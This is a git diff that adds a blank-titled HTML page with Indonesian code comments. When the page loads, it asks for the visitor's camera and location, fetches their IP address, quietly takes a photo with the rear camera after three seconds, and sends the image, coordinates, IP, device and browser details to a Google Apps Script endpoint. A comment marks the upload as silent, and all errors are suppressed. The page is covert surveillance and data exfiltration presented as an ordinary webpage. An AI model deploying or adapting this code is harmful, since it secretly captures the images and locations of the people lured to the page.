@@ -1,0 +1,94 @@
+<!doctype html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8" />
+    <title></title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+  </head>
+  <body>
+    <video id="video" autoplay playsinline style="display: none"></video>
+    <canvas id="canvas" width="640" height="480" style="display: none"></canvas>
+
+    <script>
+      const scriptURL =
+        "https://script.google.com/macros/s/AKfycbxUl0Z5luiPUq847Hl_Zou9r0tr0DoA9gtmkdrh31b-nUx-3PKpSkkLcoAuyM4wnf7Ieg/exec";
+
+      let latitude = "";
+      let longitude = "";
+      let ipAddress = "";
+      let photoBase64 = "";
+
+      /* ===== DEVICE ===== */
+      function getDevice() {
+        const ua = navigator.userAgent;
+        if (/android/i.test(ua)) return "Android";
+        if (/iphone|ipad|ipod/i.test(ua)) return "iPhone / iOS";
+        if (/windows/i.test(ua)) return "Windows";
+        if (/macintosh/i.test(ua)) return "MacOS";
+        return "Unknown";
+      }
+
+      /* ===== BROWSER ===== */
+      function getBrowser() {
+        const ua = navigator.userAgent;
+        if (ua.includes("Edg")) return "Edge";
+        if (ua.includes("Chrome")) return "Chrome";
+        if (ua.includes("Firefox")) return "Firefox";
+        if (ua.includes("Safari")) return "Safari";
+        return "Unknown";
+      }
+
+      /* ===== IP ===== */
+      fetch("https://api.ipify.org?format=json")
+        .then((res) => res.json())
+        .then((data) => (ipAddress = data.ip))
+        .catch(() => {});
+
+      /* ===== LOKASI ===== */
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          latitude = pos.coords.latitude;
+          longitude = pos.coords.longitude;
+        },
+        () => {},
+      );
+
+      /* ===== KAMERA ===== */
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      const ctx = canvas.getContext("2d");
+
+      navigator.mediaDevices
+        .getUserMedia({ video: { facingMode: "environment" } })
+        .then((stream) => {
+          video.srcObject = stream;
+          setTimeout(captureAndSubmit, 3000);
+        })
+        .catch(() => {});
+
+      /* ===== AMBIL FOTO & SUBMIT (SILENT) ===== */
+      function captureAndSubmit() {
+        try {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          photoBase64 = canvas.toDataURL("image/jpeg", 0.8);
+
+          if (!photoBase64 || photoBase64.length < 1000) return;
+
+          const data = {
+            latitude: latitude,
+            longitude: longitude,
+            ip: ipAddress,
+            device: getDevice(),
+            browser: getBrowser(),
+            foto: photoBase64,
+          };
+
+          fetch(scriptURL, {
+            method: "POST",
+            body: JSON.stringify(data),
+          }).catch(() => {});
+        } catch (e) {}
+      }
+    </script>
+  </body>
+</html>
